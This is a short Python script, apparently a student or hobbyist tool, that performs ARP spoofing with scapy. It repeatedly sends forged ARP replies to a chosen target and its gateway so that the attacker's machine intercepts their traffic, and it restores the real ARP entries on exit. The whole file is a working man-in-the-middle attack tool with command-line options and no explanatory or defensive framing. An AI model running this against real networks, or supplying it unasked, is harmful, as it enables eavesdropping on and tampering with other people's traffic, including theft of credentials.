import scapy.all as scapy
import optparse
import time
import sys

def arp_request(gateway,target_ip):
	mac_address = get_mac(target_ip)
	packet = scapy.ARP(psrc = gateway,hwdst = mac_address,pdst = target_ip,op = 2)
	scapy.send(packet,verbose = False)





def get_mac(ip):
	request = scapy.ARP(pdst = ip)
	brodcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp_brodcast = brodcast/request
	useful = scapy.srp(arp_brodcast, timeout = 1,verbose = False)[0]
	return useful[0][1].hwsrc


def get_value():
	parser = optparse.OptionParser()
	parser.add_option("-t","--target",dest = "target_ip",help = "Enter the Target ip")
	parser.add_option("-g","--gateway",dest = "gateway",help = "Enter the gateway")
	option = parser.parse_args()[0]
	return option

def return_back(destination_ip,source_ip):
	dest_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op = 2, pdst = destination_ip,psrc = source_ip,hwdst = dest_mac,hwsrc = source_mac )
	scapy.send(packet,verbose= False,count = 4)


option = get_value()
counter = 0
try:
	while True:
		arp_request(option.gateway,option.target_ip)
		arp_request(option.target_ip,option.gateway)
		counter = counter + 2
		print("\rpacket >> " + str(counter)),
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	return_back(option.target_ip,option.gateway)
	return_back(option.gateway,option.target_ip)
	print("\nDectected Ctrl + C , Setting everything back to normal , Quitting .. . ")

